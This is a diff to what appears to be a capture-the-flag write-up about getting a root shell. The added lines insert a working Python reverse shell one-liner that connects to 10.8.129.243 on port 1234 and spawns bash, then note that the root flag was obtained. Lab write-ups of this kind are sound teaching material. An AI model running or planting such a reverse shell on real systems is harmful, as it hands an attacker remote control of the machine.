@@ -304,6 +304,14 @@ Going to this section and following every single step will lead to a shell as ro
 
 ![](attachments/20240405171015.png)
 
+Reverse shell payload
+
+```shell
+`export RHOST="10.8.129.243";export RPORT=1234;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'`
+```
+
+Save the build and run.
+
 Root flag obtained.
 
 ![](attachments/20240405171044.png)
